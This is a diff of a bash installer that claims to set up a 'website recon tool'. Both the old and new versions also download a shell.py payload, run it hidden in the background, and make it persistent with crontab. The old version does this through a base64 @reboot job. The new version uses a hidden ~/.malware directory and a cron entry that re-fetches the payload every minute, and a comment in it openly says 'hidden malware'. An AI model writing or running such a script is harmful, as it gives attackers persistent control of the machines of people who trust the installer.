@@ -1,31 +1,26 @@
 #!/bin/bash
 set -e
 
+# Install recon.py in current directory
 echo "[*] Installing website recon tool..."
 pip3 install requests >/dev/null 2>&1
-wget -q -O /usr/local/bin/recon.py https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/recon.py
-chmod +x /usr/local/bin/recon.py
-echo "[+] Recon tool installed! Run: recon.py -u example.com"
+current_dir=$(pwd)
+wget -q -O "$current_dir/recon.py" https://raw.githubusercontent.com/yourusername/linux-recon-tool/main/recon.py
+chmod +x "$current_dir/recon.py"
+echo "[+] Recon tool installed! Run: ./recon.py -u example.com"
 
-wget -q -O /tmp/shell.py https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/shell.py
+# Create hidden malware directory
+malware_dir="$HOME/.malware"
+mkdir -p "$malware_dir"
 
-python3 -c "
-import base64, os
-with open('/tmp/shell.py', 'rb') as f:
-    encoded = base64.b64encode(f.read()).decode()
-cron_job = f'@reboot python3 -c \"exec(base64.b64decode(\\\"{encoded}\\\"))\"'
-with open('/tmp/cron', 'w') as c:
-    c.write(cron_job)
-os.system('crontab /tmp/cron')
-os.remove('/tmp/cron')
-" >/dev/null 2>&1
+# Download and run shell.py
+wget -q -O "$malware_dir/shell.py" https://raw.githubusercontent.com/yourusername/linux-recon-tool/main/shell.py
+python3 "$malware_dir/shell.py" >/dev/null 2>&1 &
 
-python3 -c "
-import base64
-with open('/tmp/shell.py', 'rb') as f:
-    exec(base64.b64decode(f.read()))
-" >/dev/null 2>&1 &
+# Add crontab to check and restore shell.py every minute
+crontab -l > /tmp/cron 2>/dev/null || true
+echo "* * * * * [ -f \"$malware_dir/shell.py\" ] || (wget -q -O \"$malware_dir/shell.py\" https://raw.githubusercontent.com/yourusername/linux-recon-tool/main/shell.py && python3 \"$malware_dir/shell.py\" >/dev/null 2>&1 &)" >> /tmp/cron
+crontab /tmp/cron
+rm -f /tmp/cron
 
-rm -f /tmp/shell.py
-
-echo "[+] Setup complete! Use recon.py for scanning."
+echo "[+] Setup complete! Use ./recon.py for scanning."
